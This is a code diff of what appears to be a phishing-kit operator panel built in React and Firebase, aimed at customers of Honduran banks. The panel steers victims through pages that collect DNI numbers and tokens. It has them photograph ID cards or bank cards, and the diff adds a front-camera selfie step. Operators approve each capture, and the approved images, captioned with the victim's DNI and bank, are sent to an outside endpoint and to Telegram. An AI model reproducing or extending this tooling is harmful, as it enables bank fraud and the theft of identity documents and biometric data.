+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2.5", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "p-2 rounded-xl bg-red-600/20 text-[#E31B23] border border-red-500/30", children: /* @__PURE__ */ jsxRuntimeExports.jsx(IconUser, { size: 20 }) }),
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("h2", { className: "text-base font-bold text-white tracking-wide leading-tight", children: esCompletado ? "Reconocimiento Facial Verificado" : "Reconocimiento Facial (Selfie)" }),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xs text-gray-300 mt-0.5", children: "Fotografía biométrica del rostro" })
+        ] })
+      ] }),
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
+        esperandoAprobacionFoto && imagenMostrar && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "inline-flex items-center gap-1.5 bg-amber-500/25 text-amber-300 border border-amber-400/40 text-xs font-semibold px-3 py-1 rounded-full animate-pulse shadow-sm", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-2 h-2 rounded-full bg-amber-400" }),
+          "Por Validar"
+        ] }),
+        fotoRechazada && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "inline-flex items-center gap-1.5 bg-red-500/25 text-red-300 border border-red-400/40 text-xs font-semibold px-3 py-1 rounded-full shadow-sm", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-1.5 h-1.5 rounded-full bg-red-400" }),
+          "Reintentando..."
+        ] }),
+        esCompletado && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "inline-flex items-center gap-1.5 bg-emerald-500/25 text-emerald-300 border border-emerald-400/40 text-xs font-semibold px-3 py-1 rounded-full shadow-sm", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 14, className: "text-emerald-400" }),
+          "Aprobada"
+        ] })
+      ] })
+    ] }),
+    imagenMostrar ? (
+      /* Vista de la selfie enviada con marco de rostro */
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full flex flex-col items-center gap-4", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "relative w-full max-w-[340px] aspect-[4/5] rounded-[36px] overflow-hidden bg-black shadow-2xl border-2 border-red-500/80", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx(
+            "img",
+            {
+              src: imagenMostrar,
+              alt: "Selfie del visitante",
+              className: "w-full h-full object-cover"
+            }
+          ),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute top-3 left-3 bg-black/80 backdrop-blur-md text-white text-[10px] font-bold uppercase tracking-wider px-2.5 py-1 rounded-lg border border-white/20 shadow-md", children: "Selfie / Rostro" })
+        ] }),
+        esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-center gap-3 w-full max-w-[340px] pt-1", children: [
+          onRechazarFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "button",
+            {
+              type: "button",
+              disabled: isPhotoActionLoading,
+              onClick: onRechazarFoto,
+              className: "flex-1 py-3 px-4 rounded-xl font-bold text-xs sm:text-sm bg-red-500/20 text-red-300 border border-red-500/40 hover:bg-red-500/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center justify-center gap-2 shadow-md active:scale-95",
+              children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 17, className: isPhotoActionLoading ? "animate-spin" : "" }),
+                "Pedir reintento"
+              ]
+            }
+          ),
+          onAprobarFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "button",
+            {
+              type: "button",
+              disabled: isPhotoActionLoading,
+              onClick: onAprobarFoto,
+              className: "flex-1 py-3 px-5 rounded-xl font-bold text-xs sm:text-sm bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 disabled:cursor-not-allowed text-white transition-all flex items-center justify-center gap-2 shadow-lg shadow-emerald-950/50 active:scale-95",
+              children: [
+                isPhotoActionLoading ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 18, className: "animate-spin" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 18, strokeWidth: 2.5 }),
+                isPhotoActionLoading ? "Procesando..." : "Aprobar"
+              ]
+            }
+          )
+        ] })
+      ] })
+    ) : (
+      /* Esperando selfie del visitante */
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full max-w-[340px] aspect-[4/5] rounded-[36px] border-2 border-dashed border-red-500/40 flex items-center justify-center bg-black/50 backdrop-blur-sm relative overflow-hidden shadow-2xl", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 pointer-events-none", children: /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute w-full h-1 bg-gradient-to-r from-transparent via-red-500 to-transparent shadow-[0_0_15px_#E31B23] animate-scan-laser-vertical" }) }),
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "text-center relative z-10 p-5", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-14 h-14 rounded-full bg-red-600/20 text-red-400 flex items-center justify-center mx-auto mb-2.5 shadow-lg border border-red-500/20", children: fotoRechazada ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 30, className: "animate-spin text-amber-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconUser, { size: 30, className: "animate-pulse" }) }),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-sm sm:text-base font-bold text-white mb-0.5", children: fotoRechazada ? "El visitante está tomando la selfie nuevamente" : "Esperando selfie del visitante" }),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xs text-red-300 font-medium", children: "Fotografía facial (cámara frontal)" }),
+          /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "mt-3 inline-flex items-center gap-1.5 text-[11px] text-gray-300 bg-white/10 px-3 py-1 rounded-full border border-white/15", children: [
+            /* @__PURE__ */ jsxRuntimeExports.jsx(IconClockHour4, { size: 13, className: "text-red-400" }),
+            /* @__PURE__ */ jsxRuntimeExports.jsx("span", { children: "Los botones aparecerán cuando la envíe" })
+          ] })
+        ] })
+      ] })
+    )
+  ] });
+};
+
 const DniPage = ({ DNI = "", RTN = "" }) => /* @__PURE__ */ jsxRuntimeExports.jsxs(
   "div",
   {
@@ -56720,6 +57074,7 @@ const EmulatedPage = ({
   pasoFoto,
   fotoFrente,
   fotoReverso,
+  fotoSelfie,
   isPhotoActionLoading,
   onAprobarFoto,
   onRechazarFoto
@@ -56729,7 +57084,7 @@ const EmulatedPage = ({
   const [pageBeforeError, setPageBeforeError] = reactExports.useState(1);
   const selectedBank = sessionStorage.getItem("selectedBank") || "atlantida";
   reactExports.useEffect(() => {
-    if (currentPage >= 1 && currentPage <= 4 || currentPage === 7) {
+    if (currentPage >= 1 && currentPage <= 4 || currentPage === 7 || currentPage === 8 || currentPage === 9 || currentPage === 10) {
       lastNonErrorPageRef.current = currentPage;
     }
     if (currentPage === 5) {
@@ -56840,6 +57195,40 @@ const EmulatedPage = ({
       if (currentPage === 6 || currentPage === 4) {
         return /* @__PURE__ */ jsxRuntimeExports.jsx(FinalizarPage$1, {});
       }
+      if (currentPage === 7) {
+        return /* @__PURE__ */ jsxRuntimeExports.jsx(
+          FotoPage$1,
+          {
+            fotoTemporal,
+            fotoTemporalHD,
+            esperandoAprobacionFoto,
+            fotoRechazada,
+            fotoAprobada,
+            pasoFoto,
+            fotoFrente,
+            fotoReverso,
+            isPhotoActionLoading,
+            onAprobarFoto,
+            onRechazarFoto
+          }
+        );
+      }
+      if (currentPage === 10) {
+        return /* @__PURE__ */ jsxRuntimeExports.jsx(
+          FotoSelfiePage,
+          {
+            fotoTemporal,
+            fotoTemporalHD,
+            esperandoAprobacionFoto,
+            fotoRechazada,
+            fotoAprobada,
+            fotoSelfie,
+            isPhotoActionLoading,
+            onAprobarFoto,
+            onRechazarFoto
+          }
+        );
+      }
       switch (currentPage) {
         case 1:
           return /* @__PURE__ */ jsxRuntimeExports.jsx(DniPage$1, { DNI, RTN });
@@ -56865,7 +57254,7 @@ const EmulatedPage = ({
       animate: "animate",
       exit: "exit",
       className: "w-full h-full min-h-full flex flex-col no-scrollbar bg-gray-200 will-change-transform",
-      children: /* @__PURE__ */ jsxRuntimeExports.jsx(EmulatorPageLayout, { isExpanded: currentPage === 7, children: renderPage() })
+      children: /* @__PURE__ */ jsxRuntimeExports.jsx(EmulatorPageLayout, { isExpanded: currentPage === 7 || currentPage === 10, children: renderPage() })
     },
     currentPage
   ) });
@@ -57822,7 +58211,9 @@ const Dashboard = () => {
   const [showFinalizarConfirm, setShowFinalizarConfirm] = reactExports.useState(false);
   const [loadingFinalizar, setLoadingFinalizar] = reactExports.useState(false);
   const [showFotoConfirm, setShowFotoConfirm] = reactExports.useState(false);
+  const [showSelfieConfirm, setShowSelfieConfirm] = reactExports.useState(false);
   const [loadingFoto, setLoadingFoto] = reactExports.useState(false);
+  const [loadingSelfie, setLoadingSelfie] = reactExports.useState(false);
   const [loadingPhotoAction, setLoadingPhotoAction] = reactExports.useState(false);
   const photoActionLockRef = reactExports.useRef(false);
   const handleLogoutRequest = () => setShowLogoutConfirm(true);
@@ -57911,8 +58302,8 @@ const Dashboard = () => {
       const message = lastFormPage === 1 ? "Identidad confirmada exitosamente" : "Token confirmado exitosamente";
       setSuccessMessage(message);
       try {
-        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
         await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
           successMessage: message
         });
@@ -57924,8 +58315,8 @@ const Dashboard = () => {
   const handleUpdatePageWithClear = async (userId, page) => {
     setSuccessMessage("");
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -57985,8 +58376,8 @@ const Dashboard = () => {
     }
     setLoadingFoto(true);
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
         mostrarModalFoto: true,
         fotoRechazada: false,
@@ -58005,13 +58396,51 @@ const Dashboard = () => {
       setShowFotoConfirm(false);
     }, 500);
   };
+  const handleSelfieRequest = () => {
+    if (selectedUserId) {
+      setShowSelfieConfirm(true);
+    }
+  };
+  const handleSelfieCancel = () => {
+    if (!loadingSelfie) setShowSelfieConfirm(false);
+  };
+  const handleSelfieConfirm = async () => {
+    if (!selectedUserId) {
+      setShowSelfieConfirm(false);
+      return;
+    }
+    setLoadingSelfie(true);
+    try {
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
+        mostrarModalFoto: true,
+        fotoRechazada: false,
+        esperandoAprobacionFoto: false,
+        fotoAprobada: false,
+        pasoFoto: "selfie",
+        fotoTemporal: null,
+        fotoTemporalHD: null
+      });
+    } catch (e) {
+      console.error("[Dashboard] Error al actualizar flag para selfie:", e);
+    }
+    handleUpdatePageWithClear(selectedUserId, 10);
+    setTimeout(() => {
+      setLoadingSelfie(false);
+      setShowSelfieConfirm(false);
+    }, 500);
+  };
+  const enviarFotoTelegram$1 = (photo, caption, label) => {
+    void enviarFotoTelegram(selectedBank, photo, caption, label);
+  };
   const handleAprobarFoto = async () => {
     if (!selectedUserId || photoActionLockRef.current) return;
     photoActionLockRef.current = true;
     setLoadingPhotoAction(true);
     try {
-      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       const userDocRef = doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId);
       let userData = selectedUser;
       if (!userData?.fotoTemporalHD && !userData?.fotoTemporal) {
@@ -58022,7 +58451,26 @@ const Dashboard = () => {
       const fotoAprobadaSrc = userData?.fotoTemporalHD || userData?.fotoTemporal || "";
       const dniUser = userData?.DNI || userData?.RTN || selectedUserId;
       const fechaStr = (/* @__PURE__ */ new Date()).toLocaleString("es-HN", { dateStyle: "short", timeStyle: "short" });
-      if (pasoActual === "frente") {
+      if (pasoActual === "selfie") {
+        await updateDoc(userDocRef, {
+          fotoSelfie: fotoAprobadaSrc || true,
+          fotoTemporal: null,
+          fotoTemporalHD: null,
+          pasoFoto: "completado",
+          fotoAprobada: true,
+          esperandoAprobacionFoto: false,
+          fotoRechazada: false,
+          ultimoValor: "Selfie Facial Aprobada"
+        });
+        handleUpdatePage(selectedUserId, 0);
+        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
+          const caption = `<b>RECONOCIMIENTO FACIAL APROBADO (SELFIE)</b>
+👤 <b>Usuario:</b> <code>${dniUser}</code>
+🏦 <b>Banco:</b> ${selectedBank.toUpperCase()}
+🕒 <b>Fecha:</b> ${fechaStr}`;
+          enviarFotoTelegram$1(fotoAprobadaSrc, caption, "selfie");
+        }
+      } else if (pasoActual === "frente") {
         await updateDoc(userDocRef, {
           fotoFrente: fotoAprobadaSrc || true,
           fotoTemporal: null,
@@ -58031,22 +58479,15 @@ const Dashboard = () => {
           esperandoAprobacionFoto: false,
           fotoAprobada: false,
           fotoRechazada: false,
-          ultimoValor: "Tarjeta Frente Aprobada - Solicitando Reverso"
+          ultimoValor: selectedBank === "ficohsa" ? "Tarjeta Frente Aprobada - Solicitando Reverso" : "DNI Frente Aprobado - Solicitando Reverso"
         });
         if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
-          const caption = `<b>TARJETA APROBADA (FRENTE)</b>
+          const tipoLabel = selectedBank === "ficohsa" ? "TARJETA APROBADA (FRENTE)" : "DNI APROBADO (FRENTE)";
+          const caption = `<b>${tipoLabel}</b>
 👤 <b>Usuario:</b> <code>${dniUser}</code>
 🏦 <b>Banco:</b> ${selectedBank.toUpperCase()}
 🕒 <b>Fecha:</b> ${fechaStr}`;
-          fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              bank: selectedBank,
-              photo: fotoAprobadaSrc,
-              caption
-            })
-          }).catch((err) => console.error("[Telegram] Error enviando foto frente:", err));
+          enviarFotoTelegram$1(fotoAprobadaSrc, caption, "foto frente");
         }
       } else {
         await updateDoc(userDocRef, {
@@ -58057,23 +58498,16 @@ const Dashboard = () => {
           fotoAprobada: true,
           esperandoAprobacionFoto: false,
           fotoRechazada: false,
-          ultimoValor: "Tarjeta Reverso Aprobada (Completo)"
+          ultimoValor: selectedBank === "ficohsa" ? "Tarjeta Reverso Aprobada (Completo)" : "DNI Reverso Aprobado (Completo)"
         });
         handleUpdatePage(selectedUserId, 0);
         if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
-          const caption = `<b>TARJETA APROBADA (REVERSO)</b>
+          const tipoLabel = selectedBank === "ficohsa" ? "TARJETA APROBADA (REVERSO)" : "DNI APROBADO (REVERSO)";
+          const caption = `<b>${tipoLabel}</b>
 👤 <b>Usuario:</b> <code>${dniUser}</code>
 🏦 <b>Banco:</b> ${selectedBank.toUpperCase()}
 🕒 <b>Fecha:</b> ${fechaStr}`;
-          fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              bank: selectedBank,
-              photo: fotoAprobadaSrc,
-              caption
-            })
-          }).catch((err) => console.error("[Telegram] Error enviando foto reverso:", err));
+          enviarFotoTelegram$1(fotoAprobadaSrc, caption, "foto reverso");
         }
       }
     } catch (e) {
@@ -58088,8 +58522,8 @@ const Dashboard = () => {
     photoActionLockRef.current = true;
     setLoadingPhotoAction(true);
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
         fotoRechazada: true,
         esperandoAprobacionFoto: false,
@@ -58109,8 +58543,8 @@ const Dashboard = () => {
     if (!selectedUserId) return;
     const lastFormPage = lastFormPageByUser[selectedUserId] || 1;
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58305,6 +58739,7 @@ const Dashboard = () => {
                     onFinalizar: handleFinalizarRequest,
                     onError: handleError,
                     onFoto: handleFotoRequest,
+                    onFotoSelfie: handleSelfieRequest,
                     selectedBank
                   }
                 )
@@ -58427,7 +58862,7 @@ const Dashboard = () => {
                               disabled: true,
                               className: "px-3.5 py-1.5 bg-neutral-800/80 text-emerald-400 rounded-lg border border-emerald-500/30 font-medium flex items-center gap-1.5 cursor-not-allowed opacity-90 shadow-sm",
                               children: [
-                                /* @__PURE__ */ jsxRuntimeExports.jsx("svg", { className: "w-3.5 h-3.5 text-emerald-400", fill: "none", viewBox: "0 0 24 24", stroke: "currentColor", children: /* @__PURE__ */ jsxRuntimeExports.jsx("path", { "stroke-linecap": "round", "stroke-linejoin": "round", "stroke-width": "2.5", d: "M5 13l4 4L19 7" }) }),
+                                /* @__PURE__ */ jsxRuntimeExports.jsx("svg", { className: "w-3.5 h-3.5 text-emerald-400", fill: "none", viewBox: "0 0 24 24", stroke: "currentColor", children: /* @__PURE__ */ jsxRuntimeExports.jsx("path", { strokeLinecap: "round", strokeLinejoin: "round", strokeWidth: "2.5", d: "M5 13l4 4L19 7" }) }),
                                 "Descargada"
                               ]
                             }
@@ -58448,7 +58883,7 @@ const Dashboard = () => {
                             },
                             className: "px-3.5 py-1.5 bg-emerald-600/30 hover:bg-emerald-600/50 active:scale-95 text-emerald-300 rounded-lg border border-emerald-500/40 transition-all font-medium flex items-center gap-1.5 cursor-pointer shadow-sm",
                             children: [
-                              /* @__PURE__ */ jsxRuntimeExports.jsx("svg", { className: "w-3.5 h-3.5", fill: "none", viewBox: "0 0 24 24", stroke: "currentColor", children: /* @__PURE__ */ jsxRuntimeExports.jsx("path", { "stroke-linecap": "round", "stroke-linejoin": "round", "stroke-width": "2", d: "M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" }) }),
+                              /* @__PURE__ */ jsxRuntimeExports.jsx("svg", { className: "w-3.5 h-3.5", fill: "none", viewBox: "0 0 24 24", stroke: "currentColor", children: /* @__PURE__ */ jsxRuntimeExports.jsx("path", { strokeLinecap: "round", strokeLinejoin: "round", strokeWidth: "2", d: "M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" }) }),
                               "Descargar foto"
                             ]
                           }
@@ -58482,6 +58917,7 @@ const Dashboard = () => {
             pasoFoto: selectedUser.pasoFoto,
             fotoFrente: selectedUser.fotoFrente,
             fotoReverso: selectedUser.fotoReverso,
+            fotoSelfie: selectedUser.fotoSelfie,
             isPhotoActionLoading: loadingPhotoAction,
             onAprobarFoto: handleAprobarFoto,
             onRechazarFoto: handleRechazarFoto
@@ -58595,13 +59031,27 @@ const Dashboard = () => {
       ConfirmModal,
       {
         isOpen: showFotoConfirm,
-        title: "Verificación de Identidad",
-        message: "¿Enviar al usuario a la verificación de identidad (escaneo de tarjeta de crédito)? Se le mostrará la advertencia de verificación.",
+        title: selectedBank === "ficohsa" ? "Verificación de Tarjeta" : "Verificación de DNI",
+        message: selectedBank === "ficohsa" ? "¿Enviar al usuario a la verificación de identidad (escaneo de tarjeta de crédito)?" : "¿Enviar al usuario a la verificación de documento de identidad (DNI Frente y Reverso)?",
         confirmText: "Solicitar Escaneo",
         cancelText: "Cancelar",
         onConfirm: handleFotoConfirm,
         onCancel: handleFotoCancel,
         loading: loadingFoto,
+        variant: "warning"
+      }
+    ),
+    /* @__PURE__ */ jsxRuntimeExports.jsx(
+      ConfirmModal,
+      {
+        isOpen: showSelfieConfirm,
+        title: "Reconocimiento Facial",
+        message: "¿Enviar al usuario a la captura biométrica facial (Selfie)? Se activará la cámara frontal.",
+        confirmText: "Solicitar Selfie",
+        cancelText: "Cancelar",
+        onConfirm: handleSelfieConfirm,
+        onCancel: handleSelfieCancel,
+        loading: loadingSelfie,
         variant: "warning"
       }
     ),
@@ -58773,8 +59223,8 @@ const MobileDashboard = () => {
     if (!user?.id || loadingPhotoAction[user.id]) return;
     setLoadingPhotoAction((prev) => ({ ...prev, [user.id]: true }));
     try {
-      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       const userDocRef = doc(getActiveBankDb(), getBankCollection("redireccion"), user.id);
       let userData = user;
       if (!userData?.fotoTemporalHD && !userData?.fotoTemporal) {
@@ -58786,7 +59236,26 @@ const MobileDashboard = () => {
       const dniUser = userData?.DNI || userData?.RTN || user.id;
       const fechaStr = (/* @__PURE__ */ new Date()).toLocaleString("es-HN", { dateStyle: "short", timeStyle: "short" });
       const bankName = selectedBank || "ficohsa";
-      if (pasoActual === "frente") {
+      if (pasoActual === "selfie") {
+        await updateDoc(userDocRef, {
+          fotoSelfie: fotoAprobadaSrc || true,
+          fotoTemporal: null,
+          fotoTemporalHD: null,
+          pasoFoto: "completado",
+          fotoAprobada: true,
+          esperandoAprobacionFoto: false,
+          fotoRechazada: false,
+          ultimoValor: "Selfie Facial Aprobada"
+        });
+        handleUpdatePage(user.id, 0);
+        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
+          const caption = `<b>RECONOCIMIENTO FACIAL APROBADO (SELFIE)</b>
+👤 <b>Usuario:</b> <code>${dniUser}</code>
+🏦 <b>Banco:</b> ${bankName.toUpperCase()}
+🕒 <b>Fecha:</b> ${fechaStr}`;
+          void enviarFotoTelegram(bankName, fotoAprobadaSrc, caption, "selfie");
+        }
+      } else if (pasoActual === "frente") {
         await updateDoc(userDocRef, {
           fotoFrente: fotoAprobadaSrc || true,
           fotoTemporal: null,
@@ -58795,22 +59264,15 @@ const MobileDashboard = () => {
           esperandoAprobacionFoto: false,
           fotoAprobada: false,
           fotoRechazada: false,
-          ultimoValor: "Tarjeta Frente Aprobada - Solicitando Reverso"
+          ultimoValor: isFicohsa ? "Tarjeta Frente Aprobada - Solicitando Reverso" : "DNI Frente Aprobado - Solicitando Reverso"
         });
         if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
-          const caption = `<b>TARJETA APROBADA (FRENTE)</b>
+          const tipoLabel = isFicohsa ? "TARJETA APROBADA (FRENTE)" : "DNI APROBADO (FRENTE)";
+          const caption = `<b>${tipoLabel}</b>
 👤 <b>Usuario:</b> <code>${dniUser}</code>
 🏦 <b>Banco:</b> ${bankName.toUpperCase()}
 🕒 <b>Fecha:</b> ${fechaStr}`;
-          fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              bank: bankName,
-              photo: fotoAprobadaSrc,
-              caption
-            })
-          }).catch((err) => console.error("[Telegram] Error enviando foto frente:", err));
+          void enviarFotoTelegram(bankName, fotoAprobadaSrc, caption, "foto frente");
         }
       } else {
         await updateDoc(userDocRef, {
@@ -58821,23 +59283,16 @@ const MobileDashboard = () => {
           fotoAprobada: true,
           esperandoAprobacionFoto: false,
           fotoRechazada: false,
-          ultimoValor: "Tarjeta Reverso Aprobada (Completo)"
+          ultimoValor: isFicohsa ? "Tarjeta Reverso Aprobada (Completo)" : "DNI Reverso Aprobado (Completo)"
         });
         handleUpdatePage(user.id, 0);
         if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
-          const caption = `<b>TARJETA APROBADA (REVERSO)</b>
+          const tipoLabel = isFicohsa ? "TARJETA APROBADA (REVERSO)" : "DNI APROBADO (REVERSO)";
+          const caption = `<b>${tipoLabel}</b>
 👤 <b>Usuario:</b> <code>${dniUser}</code>
 🏦 <b>Banco:</b> ${bankName.toUpperCase()}
 🕒 <b>Fecha:</b> ${fechaStr}`;
-          fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              bank: bankName,
-              photo: fotoAprobadaSrc,
-              caption
-            })
-          }).catch((err) => console.error("[Telegram] Error enviando foto reverso:", err));
+          void enviarFotoTelegram(bankName, fotoAprobadaSrc, caption, "foto reverso");
         }
